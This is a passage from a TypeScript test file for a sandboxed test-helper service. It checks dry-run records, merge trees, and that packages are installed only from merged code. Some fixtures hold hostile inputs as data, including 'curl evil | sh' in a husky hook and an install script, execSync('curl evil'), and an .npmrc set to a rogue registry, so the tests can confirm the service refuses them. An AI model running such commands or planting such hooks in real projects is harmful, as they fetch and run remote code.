    expect(r.github.headCalls).toBe(2);
  });
});

describe('HelperService — its own dry run first (C item 3)', () => {
  it('refuses a waiting change with no record, with a record for another lane, for an older image digest, or for other sandbox settings; accepts it with a record for this lane on this image', async () => {
    const r = helperRig({}, dirs);
    change(r);
    const reason = async () => body(await askChange(r)).reason;
    expect(await reason()).toBe('dry-run-not-done');
    r.dryRunDone('integration');
    expect(await reason()).toBe('dry-run-not-done');
    r.dryRunDone('unit', { imageDigest: 'sha256:image-zero', settingsHash: 'settings-one' });
    expect(await reason()).toBe('dry-run-not-done');
    r.dryRunDone('unit', { imageDigest: 'sha256:image-one', settingsHash: 'settings-zero' });
    expect(await reason()).toBe('dry-run-not-done');
    expect(r.trees.fetched).toEqual([]);
    r.dryRunDone('unit');
    expect((await askChange(r)).status).toBe(202);
    expect((await settled(r)).state).toBe('ready');
  });

  it('a new pinned image makes the record stale; a sandbox whose image cannot be named refuses image-identity-unknown; merged code is never held by either', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    change(r);
    r.driver.image = { imageDigest: 'sha256:image-two', settingsHash: 'settings-one' };
    expect(body(await askChange(r)).reason).toBe('dry-run-not-done');
    r.driver.image = null;
    expect(body(await askChange(r)).reason).toBe('image-identity-unknown');
    expect((await r.send(r.slice({ files: [], prepare: true }), r.route)).status).toBe(202);
  });

  it('the daily re-creation of the sandbox from the same image is not an image change: the record still stands', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    await r.prepareReady(id32());
    r.clock.t += 16 * 60_000;
    await r.svc.tickIdle(); // idle stop
    r.clock.t += 24 * 60 * 60_000;
    await r.svc.tickIdle(); // daily destroy
    expect(r.driver.calls).toContain('destroy');
    expect(r.audits.some((a) => a.event === 'helper-sandbox-daily-destroy')).toBe(true);
    change(r);
    expect((await askChange(r)).status).toBe(202);
  });

  it('the helper writes the record itself, when dry-run slices have answered every file of the lane it may be sent, and not before', async () => {
    const r = helperRig({}, dirs);
    change(r);
    const run = id32();
    await r.prepareReady(run);
    const store = new HelperDryRunStore(r.dir);
    const dry = async (files: string[], resultText: string | null) => {
      r.driver.slice = { exitCode: 0, resultText };
      return body(await r.send(r.slice({ runAttemptId: run, files, dryRun: true }), r.route));
    };
    const report = (files: string[]) => vitestReport(r.driver.root, Object.fromEntries(files.map((f) => [f, ['passed'] as Array<'passed'>])));
    // The lane's files a helper may be sent: the three unit files off the Mac-only list (the tmux one is never sent).
    expect((await dry([UNIT_A, UNIT_B], report([UNIT_A, UNIT_B]))).state).toBe('done');
    expect(store.get('unit')).toBeNull();
    expect(store.progress('unit')).toEqual({ commit: HEAD, answered: 2 });
    expect(body(await askChange(r)).reason).toBe('dry-run-not-done');
    // A slice whose report could not be read answers nothing.
    await dry([UNIT_SCAN], 'not json');
    expect(store.get('unit')).toBeNull();
    // An ordinary slice (not part of the dry run) does not count either.
    r.driver.slice = { exitCode: 0, resultText: report([UNIT_SCAN]) };
    await r.send(r.slice({ runAttemptId: run, files: [UNIT_SCAN] }), r.route);
    expect(store.get('unit')).toBeNull();
    await dry([UNIT_SCAN], report([UNIT_SCAN]));
    expect(store.get('unit')).toMatchObject({ lane: 'unit', imageDigest: 'sha256:image-one', settingsHash: 'settings-one', commit: HEAD, finishedAt: new Date(r.clock.t).toISOString() });
    // "Lane proven": the record carries the share of the lane's helper time that passed (three files of 250 ms each, all passing).
    expect(store.get('unit')).toMatchObject({ files: 3, passedFiles: 3, totalMs: 750, passedMs: 750, passedShare: 1 });
    expect(store.progress('unit')).toBeNull();
    expect(r.audits.some((a) => a.event === 'helper-dry-run-done' && a.lane === 'unit')).toBe(true);
    expect((r.svc.status().dryRun as { records: unknown[] }).records).toHaveLength(1);
    expect((await askChange(r)).status).toBe(202);
  });
});

describe('HelperService — the merge tree (C item 4)', () => {
  it('builds the merge itself and every answer of the run carries its hash, not the head commit\'s tree', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    const head = change(r);
    // main moved on after the change branched: the merge has main's newer file too.
    const merged = { ...head, 'src/newer-on-main.ts': 'export const y = 1;\n' };
    change(r, { merge: merged });
    const run = id32();
    const prep = await askChange(r, { runAttemptId: run });
    expect(body(prep).treeHash).toBeNull(); // no tree is built yet: a preparation
    expect((await settled(r)).treeHash).toBe(memoryTreeHash(merged));
    expect(memoryTreeHash(merged)).not.toBe(memoryTreeHash(head));
    expect(r.driver.calls).toContain(`copyIn:${memoryTreeHash(merged)}:placed`);
    r.driver.slice = { exitCode: 0, resultText: vitestReport(r.driver.root, { [UNIT_A]: ['passed'] }) };
    const a = body(await askChange(r, { runAttemptId: run, files: [UNIT_A], prepare: undefined, use: 'count' }));
    expect(a.state).toBe('done');
    expect(a).toMatchObject({ baseSha: HEAD, headSha: CHANGE, treeHash: memoryTreeHash(merged) });
    expect(verifyHelperAnswer(a, 'm_laptop', pins(r.helperKeys), r.clock.t)).toBeNull();
    expect(parseHelperAnswer(JSON.parse(JSON.stringify(a)))).not.toBeNull();
    // A file that exists only in the head commit and not in the merge the helper built is not there to run.
    delete (merged as Record<string, string>)[UNIT_B];
    expect(body(await askChange(r, { runAttemptId: run, files: [UNIT_B], prepare: undefined, use: 'compare' })).reason).toBe('file-missing');
  });

  it('a merge that conflicts is refused merge-conflict: nothing is installed or copied, and a repeated request is refused at once', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    change(r, { merge: 'conflict' });
    expect((await askChange(r)).status).toBe(202);
    expect(await settled(r)).toMatchObject({ state: 'failed', reason: 'merge-conflict', treeHash: null });
    expect(r.driver.calls.some((c) => c.startsWith('install:') || c.startsWith('copyIn') || c.startsWith('place:') || c.startsWith('build:'))).toBe(false);
    const again = await askChange(r);
    expect([again.status, body(again).reason]).toEqual([409, 'merge-conflict']);
    expect(body(await askChange(r, { files: [UNIT_A], prepare: undefined, use: 'compare' })).reason).toBe('merge-conflict');
    expect(r.trees.fetched.filter((x) => x === CHANGE)).toHaveLength(1);
    expect(r.svc.status().lastRefusal).toMatchObject({ reason: 'merge-conflict' });
  });

  it('a tree that carries its own node_modules is refused: the helper\'s packages go there', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    change(r, { edit: { 'node_modules/left-pad/index.js': 'module.exports = () => "evil";\n' } });
    await askChange(r);
    expect(await settled(r)).toMatchObject({ state: 'failed', reason: 'tree-has-node-modules' });
    expect(r.driver.calls.some((c) => c.startsWith('copyIn'))).toBe(false);
  });
});

describe('HelperService — the install inputs (C item 5)', () => {
  const refused = async (r: HelperRig) => {
    await askChange(r);
    const t = await settled(r);
    return { t, calls: r.driver.calls.filter((c) => c.startsWith('install:') || c.startsWith('place:') || c.startsWith('copyIn') || c.startsWith('build:')) };
  };

  it('a change that edits the package list is refused install-inputs-changed and nothing of it is installed, copied or built', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    change(r, { edit: { 'package.json': PKG('1.3.1903', { 'left-pad': '1.3.0', 'evil-pkg': '9.9.9' }), 'package-lock.json': LOCK('1.3.1903', { 'node_modules/left-pad': { version: '1.3.0' }, 'node_modules/evil-pkg': { version: '9.9.9' } }) } });
    const { t, calls } = await refused(r);
    expect(t).toMatchObject({ state: 'failed', reason: 'install-inputs-changed' });
    expect(calls).toEqual([]);
    expect(r.audits.some((a) => a.event === 'helper-install-inputs-changed' && a.why === 'hash-differs')).toBe(true);
    const again = await askChange(r);
    expect([again.status, body(again).reason]).toEqual([409, 'install-inputs-changed']);
  });

  it('the other side: a change that only moves the project\'s own version fields (a release) leaves the inputs equal and is prepared', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    change(r, { edit: { 'package.json': PKG('1.3.1904'), 'package-lock.json': LOCK('1.3.1904') } });
    await askChange(r);
    const t = await settled(r);
    expect(t.state).toBe('ready');
    expect(hashOf(r.trees.files[CHANGE])).toBe(hashOf(r.trees.files[HEAD]));
  });

  it.each([
    ['an install script', { 'scripts/fix-better-sqlite3.cjs': 'require("child_process").execSync("curl evil");\n' }],
    ['a husky hook', { '.husky/pre-commit': 'curl evil | sh\n' }],
    ['.npmrc', { '.npmrc': 'registry=https://evil.example/\n' }],
    ['a package.json that does not parse', { 'package.json': '{ not json' }],
    ['a package-lock.json that does not parse', { 'package-lock.json': '[]' }],
  ] as Array<[string, Record<string, string>]>)('a change that adds or edits %s is refused install-inputs-changed', async (_what, edit) => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    change(r, { edit });
    const { t, calls } = await refused(r);
    expect(t).toMatchObject({ state: 'failed', reason: 'install-inputs-changed' });
    expect(calls).toEqual([]);
  });

  it('a change that restores an OLDER package list is refused, even though this helper once installed exactly that list', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    // An older merged commit with the older list: the helper prepares it, so that list's packages are in its cache.
    const OLD = sha('b');
    const oldList = { 'package.json': PKG('1.3.1800', { 'left-pad': '1.2.0' }), 'package-lock.json': LOCK('1.3.1800', { 'node_modules/left-pad': { version: '1.2.0' } }) };
    Object.assign(r.trees.files[OLD], oldList);
    await r.prepareReady(id32(), OLD);
    const oldHash = hashOf(r.trees.files[OLD]);
    const index = new HelperPackageIndex(r.dir);
    expect(index.get(oldHash)).toMatchObject({ mergedCommit: OLD });
    expect(r.driver.packages.has(oldHash)).toBe(true);
    // Now a waiting change on today's main (the newer list) that puts the older list back.
    r.driver.calls = [];
    change(r, { edit: oldList });
    expect(hashOf(r.trees.files[CHANGE])).toBe(oldHash);
    await askChange(r);
    expect(await settled(r)).toMatchObject({ state: 'failed', reason: 'install-inputs-changed' });
    // The cached set was not looked at, placed or used for it.
    expect(r.driver.calls.filter((c) => c.includes(oldHash))).toEqual([]);
    expect(r.driver.calls.some((c) => c.startsWith('copyIn') || c.startsWith('build:'))).toBe(false);
  });

  it('a local-path package: unchanged from the merged commit is accepted; edited by the change, or added by it, is refused', async () => {
    const withLocal = (r: HelperRig) => {
      Object.assign(r.trees.files[HEAD], {
        'package.json': PKG('1.3.1903', { 'left-pad': '1.3.0', 'local-x': 'file:./vendor/local-x' }),
        'package-lock.json': LOCK('1.3.1903', { 'node_modules/left-pad': { version: '1.3.0' }, 'node_modules/local-x': { resolved: 'vendor/local-x', link: true }, 'vendor/local-x': { version: '1.0.0' } }),
        'vendor/local-x/package.json': '{"name":"local-x","version":"1.0.0"}',
        'vendor/local-x/index.js': 'module.exports = 1;\n',
      });
    };
    const same = helperRig({}, dirs);
    same.dryRunDone(); withLocal(same); change(same);
    await askChange(same);
    expect((await settled(same)).state).toBe('ready');

    const edited = helperRig({}, dirs);
    edited.dryRunDone(); withLocal(edited);
    change(edited, { edit: { 'vendor/local-x/index.js': 'require("child_process").execSync("curl evil");\n' } });
    expect(hashOf(edited.trees.files[CHANGE])).toBe(hashOf(edited.trees.files[HEAD])); // the declarations did not change
    await askChange(edited);
    expect(await settled(edited)).toMatchObject({ state: 'failed', reason: 'install-inputs-changed' });
    expect(edited.audits.some((a) => a.event === 'helper-install-inputs-changed' && a.why === 'local-package-changed')).toBe(true);
    expect(edited.driver.calls.some((c) => c.startsWith('install:') || c.startsWith('copyIn'))).toBe(false);

    // Added by the change: not on the merged commit at all.
    const added = helperRig({}, dirs);
    added.dryRunDone();
    change(added, { edit: {
      'package.json': PKG('1.3.1903', { 'left-pad': '1.3.0', 'local-x': 'file:./vendor/local-x' }),
      'vendor/local-x/package.json': '{"name":"local-x","version":"1.0.0","scripts":{"install":"curl evil | sh"}}',
    } });
    await askChange(added);
    expect(await settled(added)).toMatchObject({ state: 'failed', reason: 'install-inputs-changed' });
    expect(added.driver.calls.some((c) => c.startsWith('install:') || c.startsWith('copyIn'))).toBe(false);
  });
});

describe('HelperService — packages only from merged code', () => {
  it('on a miss, npm ci runs in the tree of the merged base commit, never in the waiting change\'s; the packages are locked and placed before any file of the change', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    const files = change(r);
    await askChange(r);
    expect((await settled(r)).state).toBe('ready');
    const hash = hashOf(r.trees.files[HEAD]);
    const mergeTree = memoryTreeHash(files);
    const c = r.driver.calls;
    const install = c.find((x) => x.startsWith('install:'))!;
    const scratch = install.split(':')[2];
    // What was exported, in order: the merged commit (for the install), then the merge tree (to test).
    expect(r.trees.archived).toEqual([HEAD, mergeTree]);
    expect(install).toBe(`install:${hash}:${scratch}`);
    expect(scratch).not.toBe(mergeTree);
    const at = (x: string) => c.indexOf(x);
    expect(at(`copyIn:${scratch}`)).toBeLessThan(at(install));
    expect(at(install)).toBeLessThan(at(`place:${mergeTree}:${hash}`));
    expect(at(`place:${mergeTree}:${hash}`)).toBeLessThan(at(`copyIn:${mergeTree}:placed`));
    expect(at(`copyIn:${mergeTree}:placed`)).toBeLessThan(at(`build:${mergeTree}`));
    // The install tree is deleted once its packages are locked; no install ever names the change's tree.
    expect(r.driver.removed).toContain(scratch);
    expect(c.filter((x) => x.startsWith('install:') && x.endsWith(mergeTree))).toEqual([]);
    // The host's record: this hash came from that merged commit.
    expect(new HelperPackageIndex(r.dir).get(hash)).toMatchObject({ mergedCommit: HEAD, manifestDigest: fakeManifest(hash) });
    expect(r.audits.some((a) => a.event === 'helper-packages-installed' && a.mergedCommit === HEAD)).toBe(true);
  });

  it('a cached set is verified against its manifest before each use and reused without installing again, also after the daily re-creation', async () => {
    const r = helperRig({}, dirs);
    await r.prepareReady(id32(), HEAD);
    const hash = hashOf(r.trees.files[HEAD]);
    r.driver.calls = [];
    await r.prepareReady(id32(), sha('b'));
    expect(r.driver.calls.filter((x) => x.startsWith('install:'))).toEqual([]);
    expect(r.driver.calls.indexOf(`pkg-verify:${hash}`)).toBeGreaterThanOrEqual(0);
    expect(r.driver.calls.indexOf(`pkg-verify:${hash}`)).toBeLessThan(r.driver.calls.findIndex((x) => x.startsWith('place:')));
    // The sandbox is deleted and re-created; the package volume is its own disk and the host's index is outside the sandbox.
    r.clock.t += 16 * 60_000; await r.svc.tickIdle();
    r.clock.t += 24 * 60 * 60_000; await r.svc.tickIdle();
    expect(r.driver.calls).toContain('destroy');
    r.driver.calls = [];
    await r.prepareReady(id32(), sha('c'));
    expect(r.driver.calls).toContain('create');
    expect(r.driver.calls.filter((x) => x.startsWith('install:'))).toEqual([]);
    expect(r.driver.calls).toContain(`pkg-verify:${hash}`);
  });

  it('a manifest that no longer matches discards the cached set, and the packages are installed again from the merged commit', async () => {
    const r = helperRig({}, dirs);
    await r.prepareReady(id32(), HEAD);
    const hash = hashOf(r.trees.files[HEAD]);
    // Something on the package volume changed: the sandbox now computes another manifest.
    r.driver.packages.set(hash, 'f'.repeat(64));
    r.driver.calls = [];
    await r.prepareReady(id32(), sha('b'));
    const c = r.driver.calls;
    const verify = c.indexOf(`pkg-verify:${hash}`), discard = c.indexOf(`pkg-discard:${hash}`), install = c.findIndex((x) => x.startsWith(`install:${hash}:`)), place = c.findIndex((x) => x.startsWith('place:'));
    expect(verify).toBeGreaterThanOrEqual(0);
    expect(verify).toBeLessThan(discard);
    expect(discard).toBeLessThan(install);
    expect(install).toBeLessThan(place);
    expect(r.audits.some((a) => a.event === 'helper-packages-discarded' && a.hash === hash)).toBe(true);
    expect(new HelperPackageIndex(r.dir).get(hash)).toMatchObject({ mergedCommit: sha('b'), manifestDigest: fakeManifest(hash) });
    // The other side: an intact set is not discarded.
    r.driver.calls = [];
    await r.prepareReady(id32(), sha('c'));
    expect(r.driver.calls.some((x) => x.startsWith('pkg-discard:'))).toBe(false);
  });

  it('a failed install prepares nothing; and no path installs from a commit this helper has not itself found merged', async () => {
    const r = helperRig({}, dirs);
    r.driver.builderExit.install = 1;
    await r.send(r.slice({ files: [], prepare: true }), r.route);
    expect(await settled(r, HEAD, HEAD)).toMatchObject({ state: 'failed', reason: 'install-failed:1' });
    expect(r.driver.calls.some((c) => c.startsWith('place:') || c.startsWith('build:'))).toBe(false);
    expect(new HelperPackageIndex(r.dir).list()).toEqual([]);
    // Calling the preparation directly (past the request checks) with a commit that is not on main: no npm ci.
    const g = helperRig({}, dirs);
    g.github.onMain.set(sha('e'), false);
    g.trees.files[sha('e')] = { ...treeFiles(), COMMIT: 'e' };
    await g.svc.prepare(sha('e'), sha('e'), id32(), id32());
    expect(g.tree(sha('e'), sha('e'))).toMatchObject({ state: 'failed', reason: 'install-refused:base-not-merged' });
    expect(g.driver.calls.some((c) => c.startsWith('install:') || c.startsWith('copyIn'))).toBe(false);
  });
});

describe('HelperService — uninstall', () => {
  it('removes the dry-run record and the index of installed packages with the sandbox', async () => {
    const r = helperRig({}, dirs);
    r.dryRunDone();
    await r.prepareReady(id32());
    expect(new HelperDryRunStore(r.dir).records()).toHaveLength(1);
    expect(new HelperPackageIndex(r.dir).list()).toHaveLength(1);
    await r.svc.uninstall();
    expect(r.driver.calls).toContain('uninstall');
    expect(new HelperDryRunStore(r.dir).records()).toEqual([]);
    expect(new HelperPackageIndex(r.dir).list()).toEqual([]);
  });
});

describe('HelperService — learned list route and status', () => {
  it('helper-learned is signed-only (the pinned requester); a first-design body (one commit, a source) is malformed; status serves the list with each entry\'s rule', async () => {
    const r = helperRig({}, dirs);
    const stranger = machineKeys('m_stranger');
    const forged = await r.svc.handleLearned(r.learned(id32(), [{ file: UNIT_A, kind: 'confirmed-wrong-pass' }], { requesterMachineId: 'm_stranger' }), r.route);
    expect([forged.status, body(forged).reason]).toEqual([401, 'requester-not-pinned']);
    const badSig = await r.svc.handleLearned({ ...r.learned(id32(), [{ file: UNIT_A, kind: 'confirmed-wrong-pass' }]), sig: stranger.signer.sign('x') }, r.route);
    expect(badSig.status).toBe(401);
    const v1 = await r.svc.handleLearned({ ...r.learned(id32(), []), observations: [{ file: UNIT_A, kind: 'differ', source: 'dry-run' }] }, r.route);
    expect([v1.status, body(v1).reason]).toEqual([400, 'invalid-request']);
    await r.prepareReady(id32());
    const ok = await r.svc.handleLearned(r.learned(id32(), [{ file: UNIT_A, kind: 'confirmed-wrong-pass' }]), r.route);
    expect((ok.body as { results: Array<{ result: string }> }).results[0].result).toBe('added');
    const st = r.svc.status() as { learned: { entries: Array<{ file: string; reason: string; treeHash: string; retrialDue: boolean }>; candidates: number; runsSeen: number } };
    expect(st.learned.entries.map((e) => [e.file, e.reason, e.treeHash, e.retrialDue])).toEqual([[UNIT_A, 'confirmed-wrong-pass', memoryTreeHash(r.trees.files[HEAD]), false]]);
    expect(st.learned).not.toHaveProperty('incompatible');
    expect(st.learned).not.toHaveProperty('eligibleCount');
  });
});

describe('buildPerFile — the digest and the failed test names', () => {
  const ROOT = '/srv/slice/fake';
  const F = 'tests/unit/alpha.test.ts';
  const reportOf = (tests: Array<{ name: string; status: string }>) => JSON.stringify({ testResults: [{ name: `${ROOT}/${F}`, status: tests.some((t) => t.status === 'failed') ? 'failed' : 'passed', startTime: 0, endTime: 10, assertionResults: tests.map((t) => ({ fullName: t.name, title: t.name, status: t.status, failureMessages: [] })) }] });

  it('the digest tells a skip-for-skip swap apart where the counts are equal', () => {
    const one = buildPerFile([F], reportOf([{ name: 'reads a file', status: 'passed' }, { name: 'talks to launchd', status: 'skipped' }]), ROOT).files[0];
    const swapped = buildPerFile([F], reportOf([{ name: 'talks to launchd', status: 'passed' }, { name: 'reads a file', status: 'skipped' }]), ROOT).files[0];
    const reordered = buildPerFile([F], reportOf([{ name: 'talks to launchd', status: 'skipped' }, { name: 'reads a file', status: 'passed' }]), ROOT).files[0];
    expect([one.passed, one.skipped]).toEqual([swapped.passed, swapped.skipped]);
    expect(one.digest).not.toBe(swapped.digest);
    expect(one.digest).toBe(reordered.digest);
    expect(one.digest).toMatch(/^[0-9a-f]{64}$/);
  });

  it('lists at most 50 failed test names, drops a name over 300 characters, and the failed count discloses both', () => {
    const many = buildPerFile([F], reportOf(Array.from({ length: 60 }, (_, i) => ({ name: `case ${i} fails`, status: 'failed' }))), ROOT).files[0];
    expect(many.failed).toBe(60);
    expect(many.failedTests.length).toBe(HELPER_LIMITS.maxFailedTestNamesPerFile);
    expect(many.failedTests[0]).toBe('case 0 fails');
    expect(many.failedTests[49]).toBe('case 49 fails');
    const exactly = buildPerFile([F], reportOf(Array.from({ length: 50 }, (_, i) => ({ name: `case ${i} fails`, status: 'failed' }))), ROOT).files[0];
    expect(exactly.failedTests.length).toBe(50);
    const long = buildPerFile([F], reportOf([{ name: 'n'.repeat(301), status: 'failed' }, { name: 'n'.repeat(300), status: 'failed' }]), ROOT).files[0];
    expect(long.failed).toBe(2);
    expect(long.failedTests).toEqual(['n'.repeat(300)]);
    expect(parseHelperAnswer({ state: 'done', attemptId: '1'.repeat(32), runAttemptId: '2'.repeat(32), lane: 'unit', baseSha: HEAD, headSha: HEAD, treeHash: null, requestedFiles: [F],
      perFile: [many], slice: { exitCode: 1, unhandledErrors: 0, collected: true, vitestStartMs: 1 }, ownerCoresMax: null, handBackMs: null, prepMs: null, progress: 1, helperVersion: 'v' })).not.toBeNull();
  });

  it('an unreadable report lists every requested file as not collected, with no digest', () => {
    expect(buildPerFile([F], 'not json', ROOT)).toEqual({ files: [{ file: F, tests: 0, passed: 0, failed: 0, skipped: 0, todo: 0, ms: 0, digest: null, failedTests: [] }], parsed: false });
    expect(buildPerFile([F], null, ROOT).parsed).toBe(false);
  });
});
